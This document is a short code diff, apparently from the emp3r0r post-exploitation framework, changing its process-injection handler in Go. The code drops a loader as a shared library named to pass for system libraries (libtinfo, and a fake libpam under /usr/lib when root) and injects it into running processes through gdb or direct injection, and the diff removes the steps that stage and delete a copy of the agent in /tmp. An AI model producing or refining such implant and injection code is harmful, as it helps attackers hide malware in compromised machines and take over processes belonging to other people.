@@ -89,8 +89,7 @@ func prepare_loader_so(pid int) (so_path string, err error) {
 	so_path = fmt.Sprintf("/%s/libtinfo.so.2.1.%d",
 		RuntimeConfig.UtilsPath, util.RandInt(0, 30))
 	if os.Geteuid() == 0 {
-		root_so_path := fmt.Sprintf("/usr/lib/x86_64-linux-gnu/libpam.so.1.%d.1", util.RandInt(0, 20))
-		so_path = root_so_path
+		so_path = fmt.Sprintf("/usr/lib/x86_64-linux-gnu/libpam.so.1.%d.1", util.RandInt(0, 20))
 	}
 	if !util.IsExist(so_path) {
 		out, err := golpe.ExtractFileFromString(file.LoaderSO_Data)
@@ -167,17 +166,7 @@ func InjectorHandler(pid int, method string) (err error) {
 	// dispatch
 	switch method {
 	case "gdb_loader":
-		err = CopySelfTo("/tmp/emp3r0r")
-		if err != nil {
-			return
-		}
 		err = GDBInjectLoader(pid)
-		if err == nil {
-			err = os.RemoveAll("/tmp/emp3r0r")
-			if err != nil {
-				return
-			}
-		}
 
 	case "gdb_shared_lib":
 		so_path, e := prepare_shared_lib()
@@ -197,14 +186,7 @@ func InjectorHandler(pid int, method string) (err error) {
 		err = CopyProcExeTo(pid, util.ProcExePath(pid)) // as long as the process is still running
 
 	case "inject_loader":
-		err = CopySelfTo("/tmp/emp3r0r")
-		if err != nil {
-			return
-		}
 		err = InjectLoader(pid)
-		if err == nil {
-			err = os.RemoveAll("/tmp/emp3r0r")
-		}
 
 	case "shared_library":
 		so_path, e := prepare_shared_lib()
